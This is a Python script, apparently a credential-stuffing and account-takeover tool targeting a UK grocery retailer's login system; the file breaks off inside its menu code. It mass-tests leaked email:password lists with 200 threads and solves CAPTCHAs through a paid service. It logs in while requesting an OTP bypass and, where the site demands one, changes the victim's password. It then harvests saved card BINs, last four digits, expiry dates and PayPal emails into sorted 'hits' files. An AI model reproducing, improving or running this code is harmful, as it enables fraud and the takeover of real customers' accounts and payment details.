#!/usr/bin/env python3
"""Ocado Checker V9 — async pipeline, full SSO card + BIN extraction.

Phase 1: validateUserInput Apex — free, no CAPTCHA (async, 200 threads)
Phase 2: reCAPTCHA → loginUser → pw change → SSO callback → wallet API
         Extracts: card type, last4, full BIN (6-digit), expiry, PayPal
         NEW V9: logs the ACTUAL login password (after upgrade) to hits file.

Usage: python3 ocado_checker.py
Requires: pip install curl_cffi tls_client
"""

import asyncio
import concurrent.futures
import json
import os
import random
import re
import string
import sys
import time
from pathlib import Path
from urllib.parse import urljoin

from curl_cffi import requests as curl_requests
from colorama import init
init()

# ═══ API Constants ══════════════════════════════════════════
APEX_URL = (
    "https://sso.ocado.com/ocado/webruntime/api/apex/execute"
    "?language=en-US&asGuest=true&htmlEncode=false"
)
RECAPTCHA_SITE_KEY = "6Ldpr1YsAAAAABudsXmh0HInFbA0V6b6InXyCj_i"
RECAPTCHA_PAGE = "https://sso.ocado.com/ocado/login"
WALLET_API = "https://www.ocado.com/api/walletservice/v3/wallet-items"
APEX_H = {
    "accept": "*/*",
    "origin": "https://sso.ocado.com",
    "referer": "https://sso.ocado.com/ocado/login",
    "Content-Type": "application/json; charset=utf-8",
    "x-b3-sampled": "0",
}
UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/143.0.0.0 Safari/537.36 OPR/127.0.0.0"
)
VALID = {"Confirmed", "Rejected"}

# ═══ Terminal Styling ═══════════════════════════════════════
IS_TTY = sys.stdout.isatty()
T  = "\033[0m"
B  = "\033[1m"
D  = "\033[2m"
I  = "\033[3m"
R  = "\033[31m"
G  = "\033[32m"
Y  = "\033[33m"
Bl = "\033[34m"
M  = "\033[35m"
C  = "\033[36m"
W  = "\033[37m"
g  = "\033[90m"
CLS = "\033[2J\033[H"
HIDE = "\033[?25l"
SHOW = "\033[?25h"


def cls():
    if IS_TTY:
        sys.stdout.write(CLS)
        sys.stdout.flush()


def wlen(s):
    """Visible width of a string (strips ANSI codes)."""
    return len(re.sub(r'\033\[[0-9;]*m', '', s))


def pad(s, width):
    """Pad string to visible width."""
    n = width - wlen(s)
    return s + " " * max(0, n)


def banner(title, sub=""):
    """Render a centered banner with double-line borders."""
    inner = 52
    top    = f"  {M}{B}╔{'═' * inner}╗{T}"
    bottom = f"  {M}{B}╚{'═' * inner}╝{T}"
    mid_t  = f"  {M}{B}║{T}{W}{B}{pad(f'  {title}', inner)}{T}{M}{B}║{T}"
    lines = [top, mid_t]
    if sub:
        mid_s = f"  {M}{B}║{T}{g}{pad(f'  {sub}', inner)}{T}{M}{B}║{T}"
        lines.append(mid_s)
    lines.append(bottom)
    return "\n".join(lines)


def sep(label="", char="─", width=56):
    """Render a section separator with optional label."""
    if label:
        n = max(1, (width - len(label) - 2) // 2)
        r = width - len(label) - 2 - n
        return f"  {g}{char * n} {W}{B}{label}{T}{g} {char * r}{T}"
    return f"  {g}{char * width}{T}"


def kv(label, value, val_color=C, indent=4):
    """Render a key: value pair."""
    return f"{' ' * indent}{W}{B}{pad(label, 10)}{T} {val_color}{value}{T}"


# ═══ Phase 1: Async Validation ══════════════════════════════

async def _check_one(sess, email, password):
    result = {"valid": False, "invalid": False, "error": "", "status": ""}
    try:
        r = await sess.post(APEX_URL, json={
            "namespace": "",
            "classname": "@udd/01pN2000009rH4V",
            "method": "validateUserInput",
            "isContinuation": False,
            "params": {"email": email, "inputCred": password},
            "cacheable": False,
        }, headers={**APEX_H, "User-Agent": UA})
        sval = r.json().get("returnValue", "")
        if sval in VALID:
            result["valid"] = True
            result["status"] = sval
        elif sval in ("Unknown", "Invalid"):
            result["invalid"] = True
        else:
            result["error"] = str(sval)[:80]
    except Exception as e:
        result["error"] = str(e)[:80]
    return result


# ═══ Phase 2: Extraction ════════════════════════════════════

def _solve_recaptcha(api_key, timeout=90):
    import tls_client
    s = tls_client.Session(client_identifier="chrome_131")
    s.timeout_seconds = 12
    r = s.post("https://api.nextcaptcha.com/createTask", json={
        "clientKey": api_key,
        "task": {
            "type": "ReCaptchaV2HSEnterpriseTaskProxyLess",
            "websiteURL": RECAPTCHA_PAGE,
            "websiteKey": RECAPTCHA_SITE_KEY,
            "isInvisible": True,
            "pageAction": "login",
        },
    })
    if r.json().get("errorId", 0) != 0:
        return None
    tid = r.json().get("taskId", 0)
    if not tid:
        return None
    dl = time.time() + timeout
    while time.time() < dl:
        time.sleep(3)
        r2 = s.post("https://api.nextcaptcha.com/getTaskResult", json={
            "clientKey": api_key, "taskId": tid})
        res = r2.json()
        if res.get("status") == "ready":
            sol = res.get("solution", {})
            t = sol.get("gRecaptchaResponse") or sol.get("token") or ""
            return t if t else None
        if res.get("status") == "failed":
            return None
    return None


def _gen_pw():
    return "".join(random.choices(string.ascii_lowercase, k=4) +
                   random.choices(string.ascii_uppercase, k=3) +
                   random.choices(string.digits, k=3) +
                   random.choices("!@#$", k=2))


def _js_redirect(text):
    for q in ('"', "'"):
        for pat in (f"window.location.replace({q}", f"window.location.href ={q}",
                    f"window.location.href={q}"):
            i = text.find(pat)
            if i >= 0:
                s_pos = i + len(pat)
                e = text.find(q, s_pos)
                if e >= 0:
                    return text[s_pos:e]
    return ""


def _follow_all(sess, url, max_hops=20):
    """Follow HTTP Location redirects + JS window.location redirects.
    Resolves relative URLs against the current page URL."""
    base = "https://www.ocado.com/"
    for _ in range(max_hops):
        if not url:
            return None
        if not url.startswith("http"):
            url = urljoin(base, url)
        try:
            r = sess.get(url, headers={"accept": "text/html"})
        except Exception:
            return None
        base = r.url
        nxt = r.headers.get("Location", "")
        if not nxt:
            nxt = _js_redirect(r.text)
        if not nxt or nxt == url:
            return r
        url = nxt
    return r


def _login_apex(sess, email, password, token):
    r = sess.post(APEX_URL, json={
        "namespace": "", "classname": "@udd/01pN2000009rH4i",
        "method": "loginUser", "isContinuation": False,
        "params": {"userEmail": email, "password": password, "startUrl": "",
                   "platformType": "OSP", "byPassOTP": True, "token": token},
        "cacheable": False}, headers=APEX_H)
    fd = r.json().get("returnValue", "")
    return fd if fd and str(fd).startswith("http") else None


def _change_password(sess, email):
    npw = _gen_pw()
    try:
        r = sess.get("https://www.ocado.com/settings/wallet",
                     headers={"accept": "text/html"})
        cp_url = _js_redirect(r.text)
        if not cp_url:
            return None
        if not cp_url.startswith("http"):
            cp_url = urljoin("https://sso.ocado.com/", cp_url)

        # If redirected to sso-login callback, password is already strong
        if "sso-login" in cp_url:
            return None

        if "ChangePassword" not in cp_url:
            return None

        r2 = sess.get(cp_url, headers={"accept": "text/html"})
        html = r2.text

        def gi(name):
            m = re.search(f'name="{name}"[^>]*value="([^"]*)"', html)
            return m.group(1) if m else ""

        fields = {
            "_CONFIRMATIONTOKEN": gi("_CONFIRMATIONTOKEN"),
            "cancelURL": gi("cancelURL"),
            "retURL": gi("retURL"),
            "save_new_url": gi("save_new_url"),
            "newpassword": npw,
            "confirmpassword": npw,
            "save": "",
        }
        if not fields["_CONFIRMATIONTOKEN"]:
            return None

        action = re.search(r'<form[^>]*action="([^"]*)"', html)
        action_url = "https://sso.ocado.com/_ui/system/security/ChangePassword"
        if action:
            au = action.group(1)
            if au.startswith("/"):
                action_url = "https://sso.ocado.com" + au
            elif au.startswith("http"):
                action_url = au

        sess.post(action_url, data=fields, headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://sso.ocado.com",
            "Referer": cp_url,
            "accept": "text/html",
        })

        # Verify: navigate wallet again, check if we get sso-login callback
        r3 = sess.get("https://www.ocado.com/settings/wallet",
                      headers={"accept": "text/html"})
        check = _js_redirect(r3.text)
        if check and "sso-login" in check:
            return npw

        return npw
    except Exception:
        return None


def _establish_session(sess):
    """Complete SSO OAuth flow. Returns True if wallet API is accessible."""
    for attempt in range(3):
        try:
            r = sess.get("https://www.ocado.com/settings/wallet",
                         headers={"accept": "text/html"})
        except Exception:
            time.sleep(1)
            continue

        callback = _js_redirect(r.text)
        if not callback:
            loc = r.headers.get("Location", "")
            if loc:
                callback = loc

        if callback:
            if not callback.startswith("http"):
                callback = urljoin("https://www.ocado.com/", callback)
            try:
                _follow_all(sess, callback, max_hops=10)
            except Exception:
                pass

        # Verify: try wallet API directly
        try:
            r2 = sess.get(WALLET_API, headers={
                "Accept": "application/json",
                "Referer": "https://www.ocado.com/settings/wallet"})
            if r2.status_code == 200:
                return True
        except Exception:
            pass

        time.sleep(1)

    return False


def _parse_cards(data):
    cards = []
    types = {}
    bins = []
    items = data if isinstance(data, list) else data.get("responseData", data.get("items", []))
    if not isinstance(items, list):
        return [], {}, []
    for item in items:
        pmt = (item.get("paymentMethodType") or "").upper()
        pm = (item.get("paymentMethod") or "").upper()
        det = item.get("details", {}) or {}
        exp = item.get("expired", False)

        if pmt == "PAYPAL" or "PAYPAL" in pm:
            types["paypal"] = types.get("paypal", 0) + 1
            pp_email = det.get("emailAddress") or det.get("email") or det.get("payerEmail") or ""
            cards.append(f"PayPal{f' ({pp_email})' if pp_email else ''}")
        elif pmt in ("APPLE_PAY", "GOOGLE_PAY"):
            types["other"] = types.get("other", 0) + 1
            cards.append(pmt.replace("_", " ").title())
        elif pmt == "CARDS" or det.get("lastFourDigits") or det.get("cardNumber"):
            l4 = det.get("lastFourDigits", "")
            if not l4:
                cn = det.get("cardNumber", "")
                l4 = cn[-4:] if len(cn) >= 4 else ""
            bin_ = det.get("bin", "")
            ct = (det.get("cardType", "CARD") or "CARD").upper()
            ct_d = ct.replace("MASTERCARD", "MC").replace("AMERICAN EXPRESS", "AMEX")
            ct_d = ct_d.replace("AMERICANEXPRESS", "AMEX")
            em = det.get("expiryMonth", "")
            ey = det.get("expiryYear", "")

            cs = f"{ct_d} ****{l4}"
            if em and ey:
                cs += f" ({em}/{str(ey)[-2:]})"
            if exp:
                cs += " [EXPIRED]"
            cards.append(cs)

            if bin_ and l4:
                bins.append(f"{bin_}{l4}")

            ct_l = ct.lower()
            if "amex" in ct_l or "american" in ct_l:
                types["amex"] = types.get("amex", 0) + 1
            elif "visa" in ct_l:
                types["visa"] = types.get("visa", 0) + 1
            elif "mc" in ct_l or "master" in ct_l:
                types["mc"] = types.get("mc", 0) + 1
            else:
                types["other"] = types.get("other", 0) + 1
    return cards, types, bins


def _sticky_proxy(proxy_url):
    """Convert a rotating proxy URL to a sticky session by injecting a random session ID."""
    if not proxy_url:
        return proxy_url
    # flashproxy format: user-session-XXX-country-GB:pass@host:port
    # or user-country-GB:pass@host:port (rotating)
    # We inject -session-{random} before -country
    import random, string
    sid = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
    if "session-" in proxy_url:
        # Replace existing session
        proxy_url = re.sub(r'session-\w+', f'session-{sid}', proxy_url)
    elif "-country-" in proxy_url:
        proxy_url = proxy_url.replace("-country-", f"-session-{sid}-country-")
    return proxy_url


def extract_cards(email, password, proxy_url, captcha_key, timeout, validation_status=""):
    """Hardened extraction with retry logic.
    Uses sticky proxy session per account.
    Handles password change for ALL accounts that need it (not just 'Rejected').
    """
    sticky = _sticky_proxy(proxy_url)

    def mk_sess():
        s = curl_requests.Session(impersonate="chrome124", timeout=timeout)
        if sticky:
            s.proxies = {"http": sticky, "https": sticky}
        s.headers.update({"User-Agent": UA})
        return s

    def try_captcha():
        for _ in range(2):
            tok = _solve_recaptcha(captcha_key)
            if tok:
                return tok
        return None

    def do_login(pw):
        """Login + frontdoor nav. Returns session or None."""
        s = mk_sess()
        tok = try_captcha()
        if not tok:
            return None
        fd = _login_apex(s, email, pw, tok)
        if not fd:
            return None
        try:
            s.get(fd, headers={"accept": "text/html"})
        except Exception:
            pass
        return s

    try:
        # ── Login ──
        sess = do_login(password)
        if not sess:
            return [], {}, [], "login_failed", password

        login_pw = password

        # ── Check SSO flow: does wallet go to ChangePassword or sso-login? ──
        r = sess.get("https://www.ocado.com/settings/wallet",
                     headers={"accept": "text/html"})
        redirect = _js_redirect(r.text)

        needs_pwchange = bool(redirect and "ChangePassword" in redirect)

        if needs_pwchange:
            # Change password regardless of Confirmed/Rejected status
            new_pw = _change_password(sess, email)
            if new_pw:
                login_pw = new_pw
                try: sess.close()
                except: pass
                sess = do_login(login_pw)
                if not sess:
                    return [], {}, [], "login2_failed", password
            else:
                return [], {}, [], "pwchange_failed", password

        # ── SSO flow + wallet API ──
        if not _establish_session(sess):
            return [], {}, [], "sso_failed", password

        r = sess.get(WALLET_API, headers={
            "Accept": "application/json",
            "Referer": "https://www.ocado.com/settings/wallet"})
        if r.status_code == 200:
            cards, types, bins = _parse_cards(r.json())
            return cards, types, bins, "", login_pw
        return [], {}, [], f"api_{r.status_code}", login_pw

    except Exception as e:
        return [], {}, [], f"err:{str(e)[:40]}", password


# ═══ Stats ══════════════════════════════════════════════════

class Stats:
    def __init__(self, threads=1, proxy="", hits_name=""):
        self.done = 0; self.p2_done = 0
        self.valid = 0; self.invalid = 0; self.errors = 0
        self.with_cards = 0; self.card_types = {}
        self.recent_valids = []
        self.threads = threads; self.proxy = proxy
        self.hits_name = hits_name
        self.lock = asyncio.Lock()


# ═══ Dashboard ══════════════════════════════════════════════

def render_dashboard(s, total, t_start):
    if not IS_TTY: return
    elapsed = max(time.monotonic() - t_start, 0.01)
    done = s.done
    cpm = int(s.done / (elapsed / 60))
    pct = int(done * 100 / total) if total else 0
    eta_s = (total - done) / max(cpm, 1) * 60 if cpm else 0
    bar_w = 36
    filled = int(bar_w * done / total) if total else 0
    bar = f"{G}{'━' * filled}{g}{'─' * (bar_w - filled)}{T}"

    out = [CLS, ""]

    out.append(f"  {M}{B}OCADO V8{T}  {g}·{T}  {D}live extraction{T}")
    out.append(f"  {g}{'─' * 56}{T}")
    out.append("")

    pct_str = f"{B}{W}{pct:3d}%{T}"
    out.append(f"  {bar}  {pct_str}")
    out.append(f"  {W}{done:,}{T}{g}/{total:,}{T}  {g}·{T}  {G}{cpm:,} CPM{T}"
               f"  {g}·{T}  {g}ETA {int(eta_s//60)}m{int(eta_s%60):02d}s{T}")
    out.append("")

    out.append(f"  {G}● {s.valid}{T} valid"
               f"   {R}● {s.invalid}{T} dead"
               f"   {Y}● {s.errors}{T} errors")
    cparts = []
    for lbl, txt, color in [("visa", "VISA", Bl), ("mc", "MC", Y),
                            ("amex", "AMEX", C), ("paypal", "PP", Bl)]:
        n = s.card_types.get(lbl, 0)
        if n: cparts.append(f"{color}{txt}{T} {W}{n}{T}")
    if s.with_cards: cparts.append(f"{W}{B}{s.with_cards} w/ cards{T}")
    if s.valid - s.with_cards > 0:
        cparts.append(f"{g}∅ {s.valid - s.with_cards}{T}")
    if cparts:
        out.append(f"  {'  '.join(cparts)}")

    if s.p2_done < s.valid and s.valid > 0:
        ext_rate = s.p2_done / max(elapsed, 1) * 60
        out.append(f"  {Y}⟳ extracting {s.p2_done}/{s.valid}{T}"
                   f"  {g}({int(ext_rate)}/min){T}")

    out.append("")
    out.append(f"  {g}{'─' * 56}{T}")
    out.append(f"  {D}  {s.hits_name}{T}")

    for v in s.recent_valids:
        out.append(f"  {v}")

    sys.stdout.write("\n".join(out) + "\n")
    sys.stdout.flush()


# ═══ Runner ═════════════════════════════════════════════════

async def run_checker(combos, proxy_url, threads, timeout, captcha_key, extract):
    total = len(combos)
    threads = min(threads, total)
    p2_threads = min(max(20, threads // 5), 150)
    t_start = time.monotonic()
    main_q = asyncio.Queue()
    for c in combos: main_q.put_nowait(c)

    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
    do_extract = bool(extract and captcha_key)
    p2_q = asyncio.Queue() if do_extract else None
    done_ev = asyncio.Event()
    p2_pool = concurrent.futures.ThreadPoolExecutor(
        max_workers=p2_threads * 2) if do_extract else None

    hits_file = Path.cwd() / f"ocado_hits_{time.strftime('%Y%m%d_%H%M%S')}.txt"
    hits_file = hits_file.resolve()
    fh = open(hits_file, "a", encoding="utf-8")
    fh.write(""); fh.flush()
    s = Stats(threads=threads, proxy=proxy_url, hits_name=hits_file.name)
    lock = s.lock
    if not IS_TTY: print(f"\n  {D}→ {hits_file}{T}")

    async def p1_worker(wid):
        sess = curl_requests.AsyncSession(
            impersonate="chrome124", timeout=timeout, proxies=proxies)
        try:
            while True:
                try: email, password = main_q.get_nowait()
                except asyncio.QueueEmpty: break
                result = await _check_one(sess, email, password)
                if result["valid"]:
                    if p2_q:
                        async with lock: s.valid += 1; s.done += 1
                        await p2_q.put((email, password, result["status"]))
                    else:
                        async with lock: s.valid += 1; s.done += 1
                        fh.write(f"{email}:{password} | {result['status']} | Skipped\n")
                        fh.flush()
                elif result["invalid"]:
                    async with lock: s.invalid += 1; s.done += 1
                elif result["error"]:
                    async with lock: s.errors += 1; s.done += 1
        finally:
            try: await sess.close()
            except: pass

    async def p2_worker(wid):
        loop = asyncio.get_event_loop()
        while not done_ev.is_set():
            try: email, password, status = p2_q.get_nowait()
            except asyncio.QueueEmpty: await asyncio.sleep(0.2); continue
            try:
                cards, ct, bins, err, login_password = await loop.run_in_executor(
                    p2_pool, extract_cards, email, password,
                    proxy_url, captcha_key, timeout, status)

                if err:
                    cards_str = f"[{err}]"
                    bin_str = ""
                    marker = f"{Y}⚠{T}"
                elif cards:
                    cards_str = ", ".join(cards) if cards else "No saved cards"
                    bin_str = " | ".join(bins) if bins else ""
                    marker = f"{G}✓{T}"
                else:
                    cards_str = "No saved cards"
                    bin_str = ""
                    marker = f"{g}·{T}"

                async with lock:
                    s.p2_done += 1
                    if cards:
                        s.with_cards += 1
                        for k, v in ct.items():
                            s.card_types[k] = s.card_types.get(k, 0) + v
                    entry = f"{marker} {email:<40s} {D}| {cards_str}{T}"
                    s.recent_valids.append(entry)
                    if len(s.recent_valids) > 8: s.recent_valids.pop(0)
                    line = f"{email}:{login_password} | {status} | {cards_str}"
                    if bin_str:
                        line += f" | BIN: {bin_str}"
                    fh.write(line + "\n"); fh.flush()
            except Exception:
                async with lock: s.p2_done += 1

    async def rloop():
        last_done = -1
        last_p2 = -1
        while not done_ev.is_set():
            if s.done != last_done or s.p2_done != last_p2:
                last_done = s.done
                last_p2 = s.p2_done
                render_dashboard(s, total, t_start)
            await asyncio.sleep(0.3)

    if IS_TTY:
        render_dashboard(s, total, t_start)
        rtask = asyncio.create_task(rloop())
    else:
        rtask = None

    p2_tasks = [asyncio.create_task(p2_worker(i)) for i in range(p2_threads)] if p2_q else []
    p1_tasks = [asyncio.create_task(p1_worker(i)) for i in range(threads)]
    await asyncio.gather(*p1_tasks, return_exceptions=True)

    if p2_q:
        # Wait for all Phase 2 items to be processed
        while s.p2_done < s.valid:
            render_dashboard(s, total, t_start)
            await asyncio.sleep(1.0)
        await asyncio.sleep(1)
        done_ev.set()
        for t in p2_tasks: t.cancel()
        if p2_pool: p2_pool.shutdown(wait=True)
    else:
        done_ev.set()
        if p2_pool: p2_pool.shutdown(wait=False)

    if rtask:
        rtask.cancel()
        try: await rtask
        except (asyncio.CancelledError, AttributeError): pass

    fh.close()
    if IS_TTY: render_dashboard(s, total, t_start)

    elapsed = time.monotonic() - t_start
    m, s_ = int(elapsed // 60), int(elapsed % 60)
    cpm = int(total / (elapsed / 60)) if elapsed > 0 else 0

    print()
    print(f"  {M}{B}COMPLETE{T}")
    print(f"  {g}{'─' * 56}{T}")
    print(f"  {W}{total:,}{T} checked  {g}·{T}  {m}m{s_:02d}s  {g}·{T}  {G}{cpm:,} CPM{T}")
    print(f"  {G}✓ {s.valid} valid{T}   {R}✗ {s.invalid} dead{T}   {Y}⚠ {s.errors} err{T}")

    cparts = []
    for lbl, txt, color in [("visa", "VISA", Bl), ("mc", "MC", Y),
                            ("amex", "AMEX", C), ("paypal", "PP", Bl)]:
        n = s.card_types.get(lbl, 0)
        if n: cparts.append(f"{color}{txt}{T} {W}{n}{T}")
    if s.with_cards: cparts.append(f"{W}{B}{s.with_cards} w/ cards{T}")
    if cparts:
        print(f"  {'  '.join(cparts)}")
    print(f"  {g}{'─' * 56}{T}")
    if s.valid:
        print(f"  {G}→{T} {D}{hits_file}{T}")
    print()

    return str(hits_file)


# ═══ Hits Sorter ════════════════════════════════════════════

SORT_EXPIRY_RE = re.compile(r"\((\d{1,2})/(\d{2,4})\)")
SORT_TYPES = ("paypal", "amex", "mc", "visa")  # priority order
TODAY = time.strftime("%Y-%m-%d")


def _sort_is_expired(card_part):
    if "[EXPIRED]" in card_part:
        return True
    m = SORT_EXPIRY_RE.search(card_part)
    if not m:
        return False
    month, year = int(m.group(1)), int(m.group(2))
    if year < 100:
        year += 2000
    now = time.localtime()
    return (year, month) < (now.tm_year, now.tm_mon)


def _sort_card_type(card_part):
    u = card_part.upper()
    if card_part.startswith("PayPal"):
        return "paypal"
    if "AMEX" in u or "AMERICAN EXPRESS" in u:
        return "amex"
    if card_part.startswith("MC") or "MASTERCARD" in u:
        return "mc"
    if card_part.startswith("Visa") or "VISA" in u:
        return "visa"
    return None


def sort_hits(hits_path):
    """Sort hits file into visa/mc/amex/paypal files.
    PayPal priority: if account has PayPal, it goes ONLY to paypal.txt.
    Removes expired cards. No double entries."""
    hits_path = Path(hits_path)
    if not hits_path.exists():
        print(f"  {R}File not found: {hits_path}{T}")
        return

    buckets = {t: [] for t in SORT_TYPES}
    clean_all = []
    skipped_no_cards = 0
    skipped_all_expired = 0
    skipped_errors = 0

    for line in hits_path.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if not line or " | " not in line:
            continue

        parts = line.split(" | ")
        if len(parts) < 3:
            continue

        creds = parts[0]
        status = parts[1]
        cards_str = parts[2]

        # Skip errors and no-cards
        if cards_str.startswith("[") or cards_str == "No saved cards":
            skipped_no_cards += 1
            continue

        # Parse cards — keep non-expired only
        valid_cards = []
        has_paypal = False
        non_pp_cards = []

        for card_part in re.split(r",\s*", cards_str):
            card_part = card_part.strip()
            if not card_part:
                continue
            if _sort_is_expired(card_part):
                continue
            cleaned = re.sub(r"\s*\[EXPIRED\]", "", card_part).strip()
            ctype = _sort_card_type(cleaned)
            if ctype == "paypal":
                has_paypal = True
                valid_cards.append(cleaned)
            elif ctype:
                non_pp_cards.append(cleaned)
                valid_cards.append(cleaned)

        if not valid_cards:
            skipped_all_expired += 1
            continue

        # Build output line (preserve BIN if present)
        bin_part = ""
        if len(parts) > 3 and parts[3].startswith("BIN:"):
            bin_part = f" | {parts[3]}"

        new_line = f"{creds} | {status} | {', '.join(valid_cards)}{bin_part}"

        # PayPal priority: if has PayPal, goes ONLY to paypal.txt
        if has_paypal:
            buckets["paypal"].append(new_line)
        else:
            # Assign to first matching type (amex > mc > visa priority)
            for ctype in ("amex", "mc", "visa"):
                ct_cards = [c for c in non_pp_cards if _sort_card_type(c) == ctype]
                if ct_cards:
                    buckets[ctype].append(new_line)
                    break

        clean_all.append(new_line)

    out_dir = hits_path.parent
    ts = time.strftime("%Y%m%d_%H%M%S")

    written = {}
    for ctype, entries in buckets.items():
        fname = f"{ctype}_{ts}.txt"
        (out_dir / fname).write_text(
            "\n".join(entries) + ("\n" if entries else ""), encoding="utf-8")
        written[ctype] = fname

    clean_name = f"ocado_hits_clean_{ts}.txt"
    (out_dir / clean_name).write_text(
        "\n".join(clean_all) + ("\n" if clean_all else ""), encoding="utf-8")

    total_valid = len(clean_all)
    print()
    print(f"  {M}{B}SORTED{T}")
    print(f"  {g}{'─' * 56}{T}")
    print(f"  {G}clean{T}      {W}{total_valid}{T} accounts  {g}{clean_name}{T}")
    for ctype in SORT_TYPES:
        n = len(buckets[ctype])
        color = {"paypal": Bl, "amex": C, "mc": Y, "visa": Bl}.get(ctype, g)
        if n:
            print(f"  {color}{ctype:<10s}{T} {W}{n}{T}  {g}{written[ctype]}{T}")
    print(f"  {g}{'─' * 56}{T}")
    print(f"  {g}skipped: {skipped_no_cards} no-cards, {skipped_all_expired} all-expired{T}")
    print(f"  {g}output: {out_dir}/{T}")
    print()


# ═══ Helpers ════════════════════════════════════════════════

def load_combos(filepath):
    combos = []
    text = Path(filepath).read_text(encoding="utf-8-sig")
    for line in text.strip().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        for sep in [":", "|"]:
            if sep in line:
                p = line.split(sep, 1)
                if len(p) == 2 and "@" in p[0]:
                    combos.append((p[0].strip(), p[1].strip()))
                    break
    return combos


def check_balance(key):
    if not key:
        return -1
    import tls_client
    try:
        s = tls_client.Session(client_identifier="chrome_131")
        s.timeout_seconds = 8
        r = s.post("https://api.nextcaptcha.com/getBalance",
                   json={"clientKey": key})
        return float(r.json().get("balance", -1))
    except Exception:
        return -1


# ═══ Config ═════════════════════════════════════════════════

CONFIG_PATH = Path.home() / ".ocado_v8.json"


def save_config(s):
    cfg = {"combo": s.combo, "proxy": s.proxy, "threads": s.threads,
           "timeout": s.timeout, "captcha_key": s.captcha_key, "extract": s.extract}
    try: CONFIG_PATH.write_text(json.dumps(cfg))
    except: pass


def load_config():
    try:
        if CONFIG_PATH.exists():
            return json.loads(CONFIG_PATH.read_text())
    except: pass
    return {}


def find_combo_files():
    found = []
    search_dirs = [
        Path("/opt/astro-aio-platform/data/combos"),
        Path.home(),
        Path("/opt"),
        Path("/root"),
    ]
    seen = set()
    for base in search_dirs:
        if not base.exists(): continue
        for p in sorted(base.iterdir()):
            if not p.is_file() or p.suffix.lower() not in (".txt",): continue
            if p.stat().st_size < 500_000: continue
            if p.stat().st_size > 200_000_000: continue
            if p.name.startswith("."): continue
            if str(p) in seen: continue
            seen.add(str(p))
            parent = p.parent.name if p.parent != base else ""
            label = f"{parent}/{p.name}" if parent else p.name
            found.append((str(p), p.stat().st_size, label))
    found.sort(key=lambda x: -x[1])
    return found[:15]


# ═══ Menu ═══════════════════════════════════════════════════

class S:
    combo = ""
    proxy = ""
    threads = 200
    timeout = 8
    captcha_key = ""
    extract = True


def _short(s, n):
    return s if len(s) <= n else s[:n-3] + "..."


def file_browser():
    files = find_combo_files()
    if not files:
        print(f"\n  {R}No combo files found.{T}")
        p = input(f"  {g}Full path:{T} ").strip().strip('"').strip("'")
        return p if p and Path(p).exists() else None

    print(f"\n{sep('COMBO FILES')}\n")
    for i, (path, size, label) in enumerate(files):
        sizemb = size / 1_000_000
        print(f"    {B}{G}[{i}]{T}  {C}{pad(label, 44)}{T} {g}{sizemb:.1f} MB{T}")

    print(f"\n    {g}[0-{len(files)-1}] select  [m] manual  [q] back{T}")
    c = input(f"  {B}{C}❯ {T}").strip().lower()

    if c == "m":
        p = input(f"  {g}Path:{T} ").strip().strip('"').strip("'")
        return p if p and Path(p).exists() else None
    if c == "q": return "__back__"
    try:
        idx = int(c)
        if 0 <= idx < len(files):
            return files[idx][0]
    except: pass
    return None


def menu():
    cfg = load_config()
    S.combo = cfg.get("combo", "")
    S.proxy = cfg.get("proxy", "")
    S.threads = cfg.get("threads", 200)
    S.timeout = cfg.get("timeout", 8)
    S.captcha_key = cfg.get("captcha_key", "")
    S.extract = cfg.get("extract", True)

    while True:
        cls()
        bal = check_balance(S.captcha_key)
        n = len(load_combos(S.combo)) if S.combo and Path(S.combo).exists() else 0

        combo_s = Path(S.combo).name if S.combo else f"{g}—{T}"
        combo_n = f"{D}({n:,}){T}" if n else ""
        proxy_s = _short(S.proxy, 28) if S.proxy else f"{g}DIRECT{T}"
        key_s = (f"{S.captcha_key[:8]}...{S.captcha_key[-4:]}"
                 if len(S.captcha_key) > 16
                 else (S.captcha_key or f"{g}—{T}"))
        bal_s = f"{G}${bal:,.2f}{T}" if bal >= 0 else f"{g}—{T}"
        ex_s = (f"{G}ON{T} {D}· BIN+PP{T}" if S.extract
                else f"{g}OFF{T}")

        lines = [
            "",
            banner("O C A D O   V 8",
                   "card  ·  BIN  ·  PayPal  extraction engine"),
            "",
            sep("CONFIG"),
            "",
            kv("Combo", f"{combo_s} {combo_n}"),
            kv("Proxy", proxy_s),
            kv("API Key", key_s),
            kv("Balance", bal_s, val_color=G),
            kv("Threads", f"{S.threads}", val_color=C),
            kv("Timeout", f"{S.timeout}s", val_color=C),
            kv("Extract", ex_s, val_color=G if S.extract else g),
            "",
            sep("MENU"),
            "",
            f"    {B}{G}▶ [1]{T}  {W}Start Checking{T}",
            f"       {C}[2]{T}  {g}Combo File{T}",
            f"       {C}[3]{T}  {g}Proxy{T}",
            f"       {C}[4]{T}  {g}Threads / Timeout{T}",
            f"       {C}[5]{T}  {g}Captcha Key{T}",
            f"       {C}[6]{T}  {g}Toggle Extraction{T}",
            f"       {C}[7]{T}  {g}Sort Hits File{T}",
            f"       {R}[q]{T}  {g}Quit{T}",
            "",
        ]
        print("\n".join(lines))

        c = input(f"  {B}{C}❯ {T}").strip().lower()

        if c == "1":
            if not S.combo:
                print(f"\n  {R}Set combo file first.{T}")
                input(); continue
            if S.extract and not S.captcha_key:
                print(f"\n  {R}Set captcha key or disable extraction.{T}")
                input(); continue
            combos = load_combos(S.combo)
            if not combos:
                print(f"\n  {R}No combos found.{T}")
                input(); continue
            save_config(S)
            hits_path = None
            try:
                hits_path = asyncio.run(run_checker(
                    combos, S.proxy, S.threads, S.timeout,
                    S.captcha_key, S.extract))
            except KeyboardInterrupt:
                print(f"\n  {Y}Stopped.{T}")
            except Exception as e:
                print(f"\n  {R}{e}{T}")

            # Ask about sorting
            if hits_path:
                sort_c = input(f"\n  {C}Sort hits into type files? {D}(y/n){T} ").strip().lower()
                if sort_c == "y":
                    sort_hits(hits_path)
            input(f"\n  {g}Press enter...{T}")

        elif c == "2":
            p = file_browser()
            if p == "__back__": continue
            if p:
                S.combo = p
                save_config(S)
            continue

        elif c == "3":
            v = input(f"  {g}Proxy (empty=direct):{T} ").strip()
            S.proxy = v
            save_config(S)
            continue

        elif c == "4":
            try:
                th = input(f"  {g}Threads (1-500):{T} ").strip()
                S.threads = max(1, min(500, int(th or "200")))
